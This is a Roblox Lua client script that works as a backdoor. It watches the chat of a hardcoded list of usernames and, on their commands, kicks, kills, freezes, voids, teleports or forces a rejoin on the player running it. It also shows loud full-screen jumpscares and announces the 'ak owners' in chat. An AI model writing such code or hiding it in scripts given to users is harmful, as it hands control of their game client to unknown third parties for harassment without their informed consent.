local adminCmd = {"Xeni_he07", "AK_ADMEN1", "AK_ADMEN2", "328ml", "GYATT_DAMN1", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD"}
local player = game.Players.LocalPlayer
local oldChat = game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
local adminSetups = {}  -- Track which admins have been set up

-- Function to notify the admin using built-in Roblox notifications
local function notifyAdmin(message)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Admin Notification";
        Text = message;
        Duration = 5; -- Duration in seconds
    })
end

-- Notify when this player uses the script
notifyAdmin(player.Name .. " is using the script.")

local function Chat(msg)
    if oldChat then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    else
        game.TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
    end
end

-- Function to setup command listeners for each admin
local function setupAdminCommands(admin)
    if adminSetups[admin.UserId] then return end  -- Exit if already set up

    adminSetups[admin.UserId] = true  -- Mark admin as set up
    admin.Chatted:Connect(function(msg)
        msg = msg:lower()

        local command = msg:match("^(%S+)") -- Extract the command only

        -- Execute commands based on the command input
        if command == "/hi" then
            Chat("I'm here!")
        elseif command == "/rejoin" then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
            Chat("Rejoin command executed successfully on " .. player.Name)
        elseif command == "/fast" then
            player.Character.Humanoid.WalkSpeed = 50
            Chat("Fast command executed successfully on " .. player.Name)
        elseif command == "/normal" then
            player.Character.Humanoid.WalkSpeed = 16
            Chat("Normal speed command executed successfully on " .. player.Name)
        elseif command == "/slow" then
            player.Character.Humanoid.WalkSpeed = 5
            Chat("Slow command executed successfully on " .. player.Name)
        elseif command == "/unfloat" then
            player.Character.HumanoidRootPart.Anchored = false
            Chat("Unfloat command executed successfully on " .. player.Name)
        elseif command == "/float" then
            player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
            wait(0.3)
            player.Character.HumanoidRootPart.Anchored = true
            Chat("Float command executed successfully on " .. player.Name)
        elseif command == "/void" then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(1000000, 1000000, 1000000)
            Chat("Void command executed successfully on " .. player.Name)
        elseif command == "/jump" then
            player.Character.Humanoid.Jump = true
            Chat("Jump command executed successfully on " .. player.Name)
        elseif command == "/trip" then
            player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
            player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
            Chat("Trip command executed successfully on " .. player.Name)
        elseif command == "/sit" then
            player.Character.Humanoid.Sit = true
            Chat("Sit command executed successfully on " .. player.Name)
        elseif command == "/freeze" then
            player.Character.HumanoidRootPart.Anchored = true
            Chat("Freeze command executed successfully on " .. player.Name)
        elseif command == "/unfreeze" then
            player.Character.HumanoidRootPart.Anchored = false
            Chat("Unfreeze command executed successfully on " .. player.Name)
        elseif command == "/kick" then
            player:Kick("Kicked")
            Chat("Kick command executed successfully on " .. player.Name)
        elseif command == "/kill" then
            player.Character.Humanoid.Health = 0
            Chat("Kill command executed successfully on " .. player.Name)
        elseif command == "/bring" then
            -- Teleport the local player to the admin's position
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and admin.Character then
                local targetHumanoidRootPart = admin.Character.HumanoidRootPart
                
                -- Teleport the local player to the admin's position
                player.Character.HumanoidRootPart.CFrame = targetHumanoidRootPart.CFrame + Vector3.new(0, 3, 0) -- Adjust height as needed
                
                Chat("You have been brought to " .. admin.Name .. ".")
            end
        elseif command == "/js" then
            local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
            local img = Instance.new("ImageLabel", jumpscareGui)
            img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=10798732430"
            local sound = Instance.new("Sound", game:GetService("SoundService"))
            sound.SoundId, sound.Volume = "rbxassetid://7076365030", 10
            sound:Play()
            wait(1.674)
            jumpscareGui:Destroy()
            sound:Destroy()
            Chat("Jumpscare (js) command executed successfully on " .. player.Name)
        elseif command == "/js2" then
            local jumpscareGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
            local img = Instance.new("ImageLabel", jumpscareGui)
            img.Size, img.Image = UDim2.new(1, 0, 1, 0), "http://www.roblox.com/asset/?id=75431648694596"
            local sound = Instance.new("Sound", game:GetService("SoundService"))
            sound.SoundId, sound.Volume = "rbxassetid://5567523008", 10
            sound:Play()
            wait(3.599)
            jumpscareGui:Destroy()
            sound:Destroy()
            Chat("Jumpscare (js2) command executed successfully on " .. player.Name)
        end
    end)
end

-- Apply commands for admins already in the game
for _, v in pairs(game.Players:GetPlayers()) do
    if table.find(adminCmd, v.Name) then
        setupAdminCommands(v)
    end
end

-- Apply commands when a new player joins
game.Players.PlayerAdded:Connect(function(newPlayer)
    if table.find(adminCmd, newPlayer.Name) then
        setupAdminCommands(newPlayer)
        Chat("An ak owner has joined your server!")
    end
end)

-- Notify when an admin leaves
game.Players.PlayerRemoving:Connect(function(leavingPlayer)
    if table.find(adminCmd, leavingPlayer.Name) then
        Chat("An ak owner has left your server!")
    end
end)
